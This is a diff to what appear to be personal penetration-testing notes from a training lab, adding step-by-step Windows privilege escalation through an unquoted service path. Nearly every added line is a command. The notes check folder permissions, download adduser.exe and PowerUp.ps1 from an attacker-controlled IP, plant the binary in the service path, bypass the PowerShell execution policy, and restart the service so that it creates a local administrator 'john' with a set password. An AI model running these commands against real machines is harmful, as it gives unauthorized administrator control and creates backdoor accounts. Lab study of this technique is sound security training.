@@ -84,9 +84,31 @@ When you gain access to a windows user do steps bellow:
       #C:\Program Files\My Program\My service\service.exe
       Get-CimInstance -ClassName win32_service | Select Name,State,PathName
       wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """   #On CMD
+
+      #find some directory that you have permission to modify, according windows order search.
+      icacls "C:\"
+      icacls "C:\Program Files"
+      icacls "C:\Program Files\Enterprise Apps" #find here!
       
       Start-Service GammaService #test permission to start
       Stop-Service GammaService
+      iwr -uri http://192.168.45.233:8000/adduser.exe -Outfile Current.exe
+      copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
+      Start-Service GammaService #despite of error, the command creates anew user and put him on Administrators grops
+
+      #for to confirm
+      net user
+      net localgroup administrators
+      # the same did later, but now with PowerUp.ps1 script
+      iwr -uri http://192.168.45.233:8000/PowerUp.ps1 -Outfile PowerUp.ps1
+      powershell -ep bypass
+      . .\PowerUp.ps1
+      Get-UnquotedService
+      Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe" #this command is going to create new exe wich can create a user named john with passwor 'Password123!'  
+       #for to confirm
+      net user
+      net localgroup administrators
+
       
       
 
